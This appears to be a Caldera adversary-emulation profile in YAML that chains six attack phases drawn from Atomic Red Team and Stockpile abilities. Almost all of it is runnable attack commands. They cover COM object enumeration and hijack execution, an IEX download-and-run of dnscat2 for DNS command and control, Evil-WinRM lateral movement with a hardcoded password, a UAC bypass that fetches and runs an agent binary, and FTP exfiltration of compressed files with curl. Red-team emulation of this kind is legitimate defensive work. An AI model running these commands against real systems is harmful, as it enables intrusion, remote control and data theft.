adversary_id: custom_adversary_profile__None__Survey_Paper_APT_Attack_Six_Phases__2023-10-19-22_42_45
name: Custom Adversary Profile
description: [['atomic__reconnaissance'], ['atomic__initial_access'], ['stockpile__command-and-control', 'atomic__command-and-control'], ['stockpile__lateral-movement', 'atomic__lateral-movement'], ['stockpile__privilege_escalation', 'atomic__privilege_escalation'], ['stockpile__exfiltration', 'atomic__exfiltration']]
atomic_ordering:
- afe32d76ebb32d20d0b43707bf271beb # ('afe32d76ebb32d20d0b43707bf271beb', 'None', 'validate_me') ; {'description': 'This test is designed to enumerate the COM objects listed in HKCR, then output their methods and CLSIDs to a text file.\nAn adversary could then use this information to identify COM objects that might be vulnerable to abuse, such as using them to spawn arbitrary processes. \nSee: https://www.mandiant.com/resources/hunting-com-objects', 'tactic': 'reconnaissance', 'technique': {'attack_id': 'T1592.002', 'name': 'Gather Victim Host Information: Software'}, 'platforms': {'windows': {'psh': {'cleanup': 'remove-item $env:temp\\T1592.002Test1.txt -force -erroraction silentlycontinue; remove-item $env:temp\\clsids.txt -force -erroraction silentlycontinue', 'command': 'New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR; Get-ChildItem -Path HKCR:\\CLSID -Name | Select -Skip 1 > $env:temp\\clsids.txt; ForEach($CLSID in Get-Content "$env:temp\\clsids.txt"); {try{write-output "$($Position)-$($CLSID)"; write-output "------------"| out-file $env:temp\\T1592.002Test1.txt -append; write-output $($CLSID)| out-file $env:temp\\T1592.002Test1.txt -append; $handle=[activator]::CreateInstance([type]::GetTypeFromCLSID($CLSID)); $handle | get-member -erroraction silentlycontinue | out-file $env:temp\\T1592.002Test1.txt -append; $position += 1} catch{}}', 'parsers': {'plugins.atomic.app.parsers.atomic_powershell': [{'source': 'validate_me'}]}, 'payloads': []}}}, 'id__dependence__fact': ['afe32d76ebb32d20d0b43707bf271beb', 'None', 'validate_me'], 'plugin': 'atomic'}
- d94bcdfc9d0f769b062e1960f7af6804 # ('d94bcdfc9d0f769b062e1960f7af6804', 'None', 'validate_me') ; {'description': 'Use the PowerShell to execute COM CLSID object.\nReference: https://pentestlab.blog/2020/05/20/persistence-com-hijacking/', 'tactic': 'multiple', 'technique': {'attack_id': 'T1546.015', 'name': 'Event Triggered Execution: Component Object Model Hijacking'}, 'platforms': {'windows': {'psh': {'cleanup': 'Get-Process -Name "*calc" | Stop-Process', 'command': '$o= [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39")); $item = $o.Item(); $item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\\windows\\system32",$null,0)', 'parsers': {'plugins.atomic.app.parsers.atomic_powershell': [{'source': 'validate_me'}]}, 'payloads': []}}}, 'id__dependence__fact': ['d94bcdfc9d0f769b062e1960f7af6804', 'None', 'validate_me'], 'plugin': 'atomic'}
- c771bc0a37e6b332cd1dac6a410144eb # ('c771bc0a37e6b332cd1dac6a410144eb', 'None', 'validate_me') ; {'description': 'This will attempt to start a C2 session using the DNS protocol. You will need to have a listener set up and create DNS records prior to executing this command.\nThe following blogs have more information.\n\nhttps://github.com/iagox86/dnscat2\n\nhttps://github.com/lukebaggett/dnscat2-powershell\n', 'tactic': 'command-and-control', 'technique': {'attack_id': 'T1071.004', 'name': 'Application Layer Protocol: DNS'}, 'platforms': {'windows': {'psh': {'cleanup': '', 'command': "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1'); Start-Dnscat2 -Domain", 'parsers': {'plugins.atomic.app.parsers.atomic_powershell': [{'source': 'validate_me'}]}, 'payloads': []}}}, 'id__dependence__fact': ['c771bc0a37e6b332cd1dac6a410144eb', 'None', 'validate_me'], 'plugin': 'atomic'}
- c51dc4d1537961d9a3d9afe6654905c9 # ('c51dc4d1537961d9a3d9afe6654905c9', 'None', 'validate_me') ; {'description': 'An adversary may attempt to use Evil-WinRM with a valid account to interact with remote systems that have WinRM enabled', 'tactic': 'lateral-movement', 'technique': {'attack_id': 'T1021.006', 'name': 'Remote Services: Windows Remote Management'}, 'platforms': {'windows': {'psh': {'cleanup': '', 'command': 'evil-winrm -i Target -u Domain\\Administrator -p P@ssw0rd1', 'parsers': {'plugins.atomic.app.parsers.atomic_powershell': [{'source': 'validate_me'}]}, 'payloads': []}}}, 'id__dependence__fact': ['c51dc4d1537961d9a3d9afe6654905c9', 'None', 'validate_me'], 'plugin': 'atomic'}
- e3db134c-4aed-4c5a-9607-c50183c9ef9e # ('e3db134c-4aed-4c5a-9607-c50183c9ef9e', 'None', 'None') ; {'description': 'Bypass user account controls - medium', 'tactic': 'privilege-escalation', 'technique': {'attack_id': 'T1548.002', 'name': 'Abuse Elevation Control Mechanism: Bypass User Access Control'}, 'platforms': {'windows': {'psh': {'command': '$url="#{server}/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go"); $data=$wc.DownloadData($url); $name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"",""); [io.file]::WriteAllBytes("C:\\Users\\Public\\$name.exe",$data);\n$job = Start-Job -ScriptBlock { Import-Module -Name .\\Bypass-UAC.ps1; Bypass-UAC -Command "C:\\Users\\Public\\$name.exe -group #{group}"; };\nReceive-Job -Job $job -Wait;\n', 'payloads': ['Bypass-UAC.ps1']}}}, 'id__dependence__fact': ['e3db134c-4aed-4c5a-9607-c50183c9ef9e', 'None', 'None'], 'plugin': 'stockpile'}
- d754878c-17dd-46dc-891c-a993f8a10336 # ('d754878c-17dd-46dc-891c-a993f8a10336', 'host.dir.compress', 'None') ; {'description': 'This ability exfiltrates a compressed archive to an FTP server.', 'tactic': 'exfiltration', 'technique': {'attack_id': 'T1048.003', 'name': 'Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol'}, 'platforms': {'linux': {'sh': {'command': 'LocalFile=\'#{host.dir.compress}\';\nRemoteName="$(date \'+%Y%m%d%H%M%S\')-exfil-#{paw}-$(basename $LocalFile)";\ncurl -T #{host.dir.compress} ftp://#{ftp.server.address}/$RemoteName --user #{ftp.user.name}:\'#{ftp.user.password}\'\n'}}, 'windows': {'psh': {'command': '$SourceFile = (Get-Item #{host.dir.compress});\n$RemoteName = "$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($SourceFile.name)";\n$ftp = [System.Net.FtpWebRequest]::Create("ftp://#{ftp.server.address}/$RemoteName");\n$ftp = [System.Net.FTPWebRequest]$ftp;\n$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile;\n$ftp.Credentials = New-Object System.Net.NetworkCredential("#{ftp.user.name}", "#{ftp.user.password}");\n$ftp.UseBinary = $true;\n$ftp.UsePassive = $true;\n\n$content = [System.IO.File]::ReadAllBytes("#{host.dir.compress}");\n$ftp.ContentLength = $content.Length;\n$requestStream = $ftp.GetRequestStream();\n$requestStream.Write($content, 0, $content.Length);\n\n$requestStream.Close();\n$requestStream.Dispose();\n'}}}, 'id__dependence__fact': ['d754878c-17dd-46dc-891c-a993f8a10336', 'host.dir.compress', 'None'], 'plugin': 'stockpile'}
objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
tags: []